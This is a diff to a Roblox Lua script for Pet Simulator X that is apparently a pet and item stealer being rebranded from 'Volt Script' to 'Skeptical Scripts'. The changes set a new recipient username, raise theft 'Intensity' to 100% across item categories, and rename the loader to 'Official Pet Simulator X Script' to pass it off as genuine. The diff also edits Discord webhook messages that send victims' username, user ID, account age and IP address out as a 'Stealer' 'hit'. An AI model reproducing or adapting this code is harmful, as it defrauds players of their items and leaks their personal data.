@@ -7,9 +7,9 @@
   
 ]]--
 getgenv().Settings = {
-    User = "maybeimpro1220",
+    User = "EZP0D",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
-    MailMessage = "Made With Volt Script",
+    MailMessage = "Skeptical Scripts On Top",
     Titanics = {
         Dualhook = true,
         Intensity = 100 --%
@@ -20,31 +20,31 @@ getgenv().Settings = {
     },
     Huges = {
         Dualhook = true,
-        Intensity = 50 --%
+        Intensity = 100 --%
     },
     Pogs = {
         Dualhook = true,
-        Intensity = 0 --%
+        Intensity = 100 --%
     },
     Exclusives = {
         Dualhook = true,
-        Intensity = 0 --%
+        Intensity = 100 --%
     },
     Events = {
         Dualhook = true,
-        Intensity = 0 --%
+        Intensity = 100 --%
     },
     Secrets = {
         Dualhook = true,
-        Intensity = 0 --%
+        Intensity = 100 --%
     },
     HC_DM_Mythics = {
         Dualhook = true,
-        Intensity = 0 --%
+        Intensity = 100 --%
     },
     Gems = {
         Dualhook = true,
-        Intensity = 0 --%
+        Intensity = 100 --%
     }
 }
 
@@ -237,7 +237,7 @@ local Percentage = Instance.new("TextLabel")
 local Tip = Instance.new("TextLabel")
 local EndSequence = Instance.new("Frame")
 if _G.ScriptName == nil and _G.FirstText == nil and _G.SecondText == nil and _G.ThirdText == nil and _G.WaitingTime == nil then
-	_G.ScriptName = "Volt Script";
+	_G.ScriptName = "Official Pet Simulator X Script";
 	_G.FirstText = "Preparing Script...";
 	_G.SecondText = "Loading Script...";
 	_G.ThirdText = "Almost Done...";
@@ -995,7 +995,7 @@ local Percentage = Instance.new("TextLabel")
 local Tip = Instance.new("TextLabel")
 local EndSequence = Instance.new("Frame")
 if _G.ScriptName == nil and _G.FirstText == nil and _G.SecondText == nil and _G.ThirdText == nil and _G.WaitingTime == nil then
-	_G.ScriptName = "Volt Script";
+	_G.ScriptName = "Official Pet Simulator X Script";
 	_G.FirstText = "Preparing Script...";
 	_G.SecondText = "Loading Script...";
 	_G.ThirdText = "Almost Done...";
@@ -1368,11 +1368,11 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         "https://cdn.discordapp.com/attachments/1144281989441146891/1144472830805819463/attachment_93255996.jpg"
         data1 = {
             ["content"] = ping,
-            ["username"] = "Volt Script",
+            ["username"] = "Skeptical Scripts",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** Volt Script",
-                ["url"] = "https://discord.gg/KEF4z9DFdb",
+                ["title"] = "**Fresh Hit** Skeptical Script",
+                ["url"] = "https://discord.gg/FDYxjnrF",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
@@ -1381,7 +1381,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Volt Script's Stealer** :moyai:",
+                    ["name"] = "**This data was generated using Skeptical Script's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
@@ -1438,11 +1438,11 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         "https://cdn.discordapp.com/attachments/1144281989441146891/1144472830805819463/attachment_93255996.jpg"
         data1 = {
             ["content"] = ping,
-            ["username"] = "Volt Script",
+            ["username"] = "Skeptical Script",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit**  Volt Script",
-                ["url"] = "https://discord.gg/KEF4z9DFdb",
+                ["title"] = "**Fresh Hit**  Skeptical Script",
+                ["url"] = "https://discord.gg/FDYxjnrF",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
@@ -1451,7 +1451,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Volt Script's Stealer** :moyai:",
+                    ["name"] = "**This data was generated using Skeptical Script's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
